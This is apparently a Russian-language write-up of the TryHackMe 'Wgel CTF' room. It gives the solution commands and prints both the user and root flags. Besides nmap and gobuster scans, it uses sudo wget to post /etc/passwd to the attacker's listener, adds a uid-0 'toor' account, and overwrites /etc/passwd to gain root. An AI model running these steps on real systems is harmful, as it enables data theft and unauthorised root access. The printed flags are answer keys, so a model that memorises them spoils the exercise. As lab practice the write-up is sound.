

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Wgel CTF](https://tryhackme.com/r/room/wgelctf) 

Всего 1 заданиe:
## Задание 1
Получайте удовольствие от этой простой коробки.

### Ответьте на вопросы ниже
```commandline
sudo nmap -sV -sS -A <IP>
gobuster dir -u http://<IP>/ -x php,txt -w /usr/share/wordlists/dirb/common.txt -t 20
gobuster dir -u http://<IP>/sitemap/ -x php,txt -w /usr/share/wordlists/dirb/common.txt -t 20
ssh -i id_rsa jessie@<IP>
cat user_flag.txt
```
Пользовательский флаг
```commandline
057c67131c3d5e42dd5cd3075b198ff6
```

```commandline
sudo -l
nc -lvnp 5555K
sudo /usr/bin/wget --post-file=/etc/passwd http://<YOUR_TUN0_IP>:5555
echo "toor:`openssl passwd toor`:0:0:root:/root:/bin/bash" >> passwd
python3 -m http.server
sudo /usr/bin/wget http://<YOUR_TUN0_IP>:8000/passwd -O /etc/passwd
su toor
```
Корневой флаг
```commandline
b1b968b37519ad1daa6408188649263d
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)